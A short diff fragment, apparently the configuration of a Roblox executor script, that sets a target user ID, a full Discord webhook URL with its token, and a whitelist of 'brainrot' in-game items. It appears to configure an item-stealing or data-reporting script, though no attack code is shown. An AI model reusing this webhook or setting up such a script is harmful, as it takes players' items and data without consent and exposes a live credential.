@@ -1,4 +1,4 @@
-getgenv().targetUserId = rzgr1ks
+getgenv().targetUserId = 1957818516
 getgenv().webhookURL = "https://discord.com/api/webhooks/1478495703822110731/-YzX6BprkXMNpejVVFWJDch-TuTtfUZVbILQXUmZavGmKwTT3G556xcTli2ijJIImv1F"
 getgenv().whitelistBrainrot = {
     ["Skibidi Toilet"] = true,
